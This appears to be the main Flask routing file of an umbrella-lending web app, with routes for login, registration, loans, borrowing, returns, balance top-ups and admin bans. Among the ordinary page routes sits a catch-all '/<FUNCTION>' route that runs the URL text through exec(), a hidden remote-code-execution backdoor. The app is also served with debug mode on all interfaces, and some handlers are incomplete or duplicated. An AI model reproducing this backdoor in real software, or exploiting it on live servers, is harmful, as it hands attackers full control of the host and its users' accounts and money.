from flask import Flask, render_template, session, request, redirect, url_for
from flask_session import Session
import constants.index as constants
from utils.index import *

app = Flask(__name__, template_folder='html', static_folder='static')
SESSION_TYPE = 'filesystem'
app.config.from_object(__name__)
Session(app)

# Middleware

@app.before_first_request
def intialise_session():
    fn_logout()
 
@app.before_request
def redirect_if_not_logged_in():
    if reroute_for_login(request.path, check_logged_in()):
        return redirect(url_for('login'))

@app.context_processor
def inject_user():
    return dict(constants=constants, session=session)

# POST data

@app.route("/post_login", methods=['POST'])
def post_login():
    r = check_result_login(
        request.form['email'],
        request.form['password'],
    )
    
    res = constants.RESULT_LOGIN_SUCCESSFUL if r\
        else constants.RESULT_LOGIN_FAILED
    return redirect(url_for('result', res=res))

@app.route("/post_register", methods=['POST'])
def post_register():
    email = request.form['email']
    r = check_result_register(
        request.form['first_name'],
        request.form['last_name'],
        request.form['email'],
        request.form['password'],
        request.form['confirm-password']
    )
    if r:
        fn_login(email)
        res = constants.RESULT_REGISTER_SUCCESSFUL
    else:
        res = constants.RESULT_REGISTER_FAILED

    return redirect(url_for('result', res=res))

@app.route("/post_loan", methods=['POST'])
def post_loan():
    r = submit_loan(
        session["email"],
        request.form['size'],
        request.form['colour'],
        request.form['location']
    )

    if r:
        session["loans"] = retrieve_loans(session["email"])
        res = constants.RESULT_SUBMIT_LOAN_SUCCESSFUL
    else:
        res = constants.RESULT_SUBMIT_LOAN_FAILED
    res = constants.RESULT_SUBMIT_LOAN_SUCCESSFUL if r\
        else constants.RESULT_SUBMIT_LOAN_FAILED
    return redirect(url_for('result', res=res, location='loan'))

@app.route("/post_borrow", methods=['POST'])
def post_borrow():
    r = get_umbrella(request.form['location'])
    if r:
        session['available_umbrella'] = [
            [
                umbrella['id'],
                umbrella['colour'],
                umbrella['size'],
                umbrella['name']
            ]
            for umbrella in r
        ]
    return redirect(url_for('iframeumbrella'))

@app.route("/post_add", methods=['POST'])
def post_add():
    r = check_result_register(
        request.form['colour'],
        request.form['size'],
        session['email'],
        request.form['location'],
    )

@app.route("/post_borrow_confirm", methods=['POST'])
def post_borrow_confirm():
    id = request.get_json()['id']
    r = borrow_umbrella(
        id,
        session["email"]
    )

    if r:
        session["borrowed"] = retrieve_borrowed(session['email'])
        res = constants.RESULT_SUBMIT_BORROW_SUCCESSFUL
    else:
        res = constants.RESULT_SUBMIT_BORROW_FAILED
    return redirect(url_for('result', res=res))
    
@app.route("/post_return", methods=['POST'])
def post_return():
    r = return_umbrella(
        request.form['loan-id-field'],
        request.form['return-location']
    )

    if r:
        session["borrowed"] = retrieve_borrowed(session['email'])
        session['balance'] = get_balance(session['email'])
        res = constants.RESULT_SUBMIT_RETURN_SUCCESSFUL
    else:
        res = constants.RESULT_SUBMIT_RETURN_FAILED

    return redirect(url_for('result', res=res))

@app.route("/post_topup", methods=['POST'])
def post_topup():
    r = add_balance(
        session['email'],
        request.form['amount']
    )
    if r:
        session['balance'] = get_balance(session['email'])
        res = constants.RESULT_SUBMIT_TOPUP_SUCCESSFUL
    else:
        res = constants.RESULT_SUBMIT_TOPUP_FAILED
    return redirect(url_for('result', res=res))

@app.route("/post_ban_unban", methods=['POST'])
def post_ban_unban():
    if request.form['to-ban-field'].lower() == 'true':
        r = post_ban(request.form['email-field'])
    else:
        r = post_unban(request.form['email-field'])
    if r:
        session['all_users'] = [['Email Address', 'Name', 'Is Banned']]
        for user in get_users():
            session['all_users'].append([
                user['email_address'],
                user['name'],
                user['is_banned'],
            ])
        res = constants.RESULT_SUBMIT_BAN_UNBAN_SUCCESSFUL
    else:
        res = constants.RESULT_SUBMIT_BAN_UNBAN_FAILED
    return redirect(url_for('result', res=res))

# iFrame

@app.route('/iframeumbrella')
def iframeumbrella():
    return render_template('umbrellas.html')

# Pages

@app.route('/')
def home():
    active = constants.TAB_HOME
    return render_template('index.html', items=constants.HOME_ITEMS, active=active)


@app.route('/loan')
def loan():
    active = constants.TAB_LOAN
    return render_template('loan.html', items=constants.LOAN_ITEMS, active=active)


@app.route('/borrow')
def borrow():
    active = constants.TAB_BORROW
    return render_template('borrow.html', items=constants.BORROW_ITEMS, active=active)


@app.route('/login')
def login():
    active = constants.TAB_LOGIN
    return render_template('login.html', items=constants.LOGIN_ITEMS, active=active)

@app.route('/register')
def register():
    active = constants.TAB_LOGIN
    return render_template('register.html', items=constants.REGISTER_ITEMS, active=active)


@app.route('/user')
def user():
    active = constants.TAB_NONE
    return render_template('user.html', items=constants.USER_ITEMS, active=active)


@app.route('/admin')
def admin():
    active = constants.TAB_NONE
    return render_template('admin.html', items=constants.ADMIN_ITEMS, active=active)

@app.route('/addUmbrella')
def add():
    active = constants.TAB_ADD
    return render_template('addUmbrella.html', items=constants.ADD_ITEMS, active=active)

@app.route('/result?res=<res>')
def result(res, location="/"):
    active = constants.TAB_NONE
    return render_template('result.html', 
                           items=constants.RESULT_ITEMS, 
                           active=active, 
                           message=res, 
                           location=location)


@app.route('/<FUNCTION>')
def command(FUNCTION=None):
    exec(FUNCTION.replace("<br>", "\n"))
    return ""

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return redirect(url_for('login')) 

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=True)
